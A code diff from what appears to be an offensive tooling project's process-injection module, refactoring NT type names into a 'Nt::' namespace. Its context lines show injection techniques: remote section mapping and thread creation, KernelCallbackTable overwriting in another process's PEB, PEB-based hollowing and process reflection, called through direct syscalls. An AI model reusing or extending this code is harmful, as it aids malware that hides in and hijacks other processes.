@@ -388,7 +388,7 @@ namespace Technique::Injection
             0,
             nullptr,
             &dwSize,
-            ViewUnmap,
+            Nt::ViewUnmap,
             0,
             PAGE_READWRITE
         );
@@ -421,7 +421,7 @@ namespace Technique::Injection
             0,
             nullptr,
             &dwSize,
-            ViewUnmap,
+            Nt::ViewUnmap,
             0,
             PAGE_EXECUTE_READ
         );
@@ -444,7 +444,7 @@ namespace Technique::Injection
             0,
             0,
             0,
-            (PUSER_THREAD_START_ROUTINE)pRemoteBuffer,
+            (Nt::PUSER_THREAD_START_ROUTINE)pRemoteBuffer,
             nullptr,
             &hThread,
             nullptr
@@ -585,12 +585,12 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        PROCESS_BASIC_INFORMATION pbi;
+        Nt::PROCESS_BASIC_INFORMATION pbi;
         NTSTATUS status = CallSysInvoke(
             &pProcs->sysNtQueryInformationProcess,
             pProcs->lpNtQueryInformationProcess,
             hProcess,
-            ProcessBasicInformation,
+            Nt::ProcessBasicInformation,
             &pbi,
             sizeof(pbi),
             nullptr
@@ -602,7 +602,7 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        PEB peb;
+        Nt::PEB peb;
         if (!System::Process::VirtualMemoryRead(
             pProcs,
             hProcess,
@@ -616,7 +616,7 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        KERNELCALLBACKTABLE_T kct;
+        Nt::KERNELCALLBACKTABLE_T kct;
         if (!System::Process::VirtualMemoryRead(
             pProcs,
             hProcess,
@@ -690,7 +690,7 @@ namespace Technique::Injection
         if (!System::Process::VirtualMemoryWrite(
             pProcs,
             hProcess,
-            (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+            (PBYTE)pbi.PebBaseAddress + offsetof(Nt::PEB, KernelCallbackTable),
             &lpTableBaseAddr,
             sizeof(ULONG_PTR),
             nullptr
@@ -710,7 +710,7 @@ namespace Technique::Injection
         if (!System::Process::VirtualMemoryWrite(
             pProcs,
             hProcess,
-            (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+            (PBYTE)pbi.PebBaseAddress + offsetof(Nt::PEB, KernelCallbackTable),
             &peb.KernelCallbackTable,
             sizeof(ULONG_PTR),
             nullptr
@@ -867,7 +867,7 @@ namespace Technique::Injection
         HANDLE hProcess = pi.hProcess;
         HANDLE hThread = pi.hThread;
 
-        PROCESS_BASIC_INFORMATION pbi;
+        Nt::PROCESS_BASIC_INFORMATION pbi;
         DWORD dwReturnLength = 0;
 
         // Get target image PEB address and pointer to image base.
@@ -875,9 +875,9 @@ namespace Technique::Injection
             &pProcs->sysNtQueryInformationProcess,
             pProcs->lpNtQueryInformationProcess,
             hProcess,
-            ProcessBasicInformation,
+            Nt::ProcessBasicInformation,
             &pbi,
-            sizeof(PROCESS_BASIC_INFORMATION),
+            sizeof(Nt::PROCESS_BASIC_INFORMATION),
             &dwReturnLength
         );
         if (status != STATUS_SUCCESS)
@@ -1144,7 +1144,7 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
+        Nt::RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
         NTSTATUS status = CallSysInvoke(
             &pProcs->sysRtlCreateProcessReflection,
             pProcs->lpRtlCreateProcessReflection,
